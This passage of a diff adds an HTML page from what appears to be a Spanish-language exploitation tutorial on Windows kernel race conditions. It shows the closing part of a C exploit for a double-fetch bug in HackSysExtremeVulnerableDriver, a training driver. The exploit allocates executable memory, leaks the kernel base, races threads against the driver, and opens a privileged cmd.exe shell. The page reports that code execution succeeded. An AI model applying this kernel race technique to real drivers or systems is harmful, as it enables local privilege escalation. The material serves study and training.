+</span></span><span style="display:flex;"><span>                                     (MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE),
+</span></span><span style="display:flex;"><span>                                     PAGE_EXECUTE_READWRITE);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lpvMemoryAllocation <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to allocate exploitation buffer</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Successfully allocated exploitation buffer</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* You already know ;)  */</span>
+</span></span><span style="display:flex;"><span>  lpvNtKrnl <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetKernelModuleBase</span>(<span style="color:#e6db74">&#34;ntoskrnl&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lpvNtKrnl <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to obtain the base address of nt</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Obtained the base address of nt: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, lpvNtKrnl);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Fill up the buffer */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">GenerateExploitBuffer</span>(lpvNtKrnl, lpvMemoryAllocation);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Setup the Double Fetch object */</span>
+</span></span><span style="display:flex;"><span>  pDoubleFetchObject<span style="color:#f92672">-&gt;</span>Buffer <span style="color:#f92672">=</span> lpvMemoryAllocation;
+</span></span><span style="display:flex;"><span>  pDoubleFetchObject<span style="color:#f92672">-&gt;</span>Size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Setup the base IRP argument(s) */</span>
+</span></span><span style="display:flex;"><span>  pIrpArgs<span style="color:#f92672">-&gt;</span>hHEVD <span style="color:#f92672">=</span> hHEVD;
+</span></span><span style="display:flex;"><span>  pIrpArgs<span style="color:#f92672">-&gt;</span>pDoubleFetch <span style="color:#f92672">=</span> pDoubleFetchObject;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Start the race!! */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Viol, Opr, Conspiracy Origins</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_THREADS; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    hThreadWork[i] <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateThread</span>(NULL,  <span style="color:#ae81ff">0</span>, TriggerWorkingCondition, pIrpArgs, <span style="color:#ae81ff">0</span>, NULL);
+</span></span><span style="display:flex;"><span>    hThreadRace[i] <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateThread</span>(NULL,  <span style="color:#ae81ff">0</span>, TriggerRaceCondition, pIrpArgs, <span style="color:#ae81ff">0</span>, NULL);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">WaitForMultipleObjects</span>(NUM_THREADS, hThreadWork, TRUE, <span style="color:#ae81ff">10000</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_THREADS; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">TerminateThread</span>(hThreadWork[i], <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CloseHandle</span>(hThreadWork[i]);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">TerminateThread</span>(hThreadRace[i], <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CloseHandle</span>(hThreadRace[i]);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">CheckWin</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  HANDLE hHEVD <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  hHEVD <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFileA</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>,
+</span></span><span style="display:flex;"><span>                      (GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE),
+</span></span><span style="display:flex;"><span>                      <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                      NULL,
+</span></span><span style="display:flex;"><span>                      OPEN_EXISTING,
+</span></span><span style="display:flex;"><span>                      FILE_ATTRIBUTE_NORMAL,
+</span></span><span style="display:flex;"><span>                      NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">Exploit</span>(hHEVD) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] We won the race!!! Enjoy de shell!!</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cmd.exe&#34;</span>);
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Exploitation failed, run again</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">!=</span> INVALID_HANDLE_VALUE) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CloseHandle</span>(hHEVD);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Una vez enviado, tenemos ejecución de código:</p>
+<p><img src="/0x08-Modern-Windows-Kernel-Race-Conditions/exploit.gif" alt="alt text"></p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
